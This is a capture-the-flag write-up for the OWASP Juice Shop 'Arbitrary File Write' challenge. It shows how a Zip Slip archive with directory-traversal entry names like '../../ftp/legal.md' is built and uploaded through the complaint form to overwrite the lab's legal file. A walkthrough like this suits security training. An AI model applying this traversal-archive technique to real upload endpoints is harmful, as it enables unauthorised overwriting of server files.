## Arbitrary File Write
**Category:** Vulnerable Components

**Difficulty:** 6/6

**Challenge Description:** Overwrite the Legal Information file.

## Approach

### Vulnerable File Uploads

During the previous challenges I only notices two pages, which allow a file upload:

- `/profile` (upload of a profile picture)
- `/#/complain` (upload of a ZIP file with complaints)

Since a image upload is not very promising for arbitrary file write, I decided to focus on the ZIP upload.

### ZIP Slip Vulnerability

Due to some previous CTF challenges, I already knew that a ZIP extraction in the backend can lead to arbitrary fiel write. This is because the archive holds directory traversal filenames (for more information see [Zip Slip Vulnerability](https://security.snyk.io/research/zip-slip-vulnerability)).

### Putting together the right Archive Structure

What we know so far is, that the legal file is located at `/ftp/legal.md`. But we don't know the extraction point of the ZIP archive. Therefor we have to try different archive depths until it replaces the legal file in the ftp endpoint.

Attempt 1:

```
┌──(orb1t4l㉿elysium)-[~/OWASP/juice-shop/zip-slip/output]
└─$ zip evil.zip ../ftp/legal.md .
  adding: ../ftp/legal.md (deflated 2%)
```

This ZIP archive did not overwrite the legal file, time to add another layer.

Attempt 2:

```
┌──(orb1t4l㉿elysium)-[~/…/juice-shop/zip-slip/output/output-layer2]
└─$ zip evil.zip ../../ftp/legal.md .
  adding: ../../ftp/legal.md (deflated 2%)
```

After uploading the second attempt, I instantly got the challenge solved notification, time to verify it by myself.

```
┌──(orb1t4l㉿elysium)-[~/OWASP/juice-shop/zip-slip]
└─$ wget http://192.168.0.1:3000/ftp/legal.md
--2024-10-01 11:41:33--  http://192.168.0.1:3000/ftp/legal.md
Connecting to 192.168.0.1:3000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 44 [text/markdown]
Saving to: ‘legal.md’

legal.md            100%[===================>]      44  --.-KB/s    in 0s      

2024-10-01 11:41:33 (5.27 MB/s) - ‘legal.md’ saved [44/44]

                                                                                
┌──(orb1t4l㉿elysium)-[~/OWASP/juice-shop/zip-slip]
└─$ cat legal.md       
This is not the original legal information!
```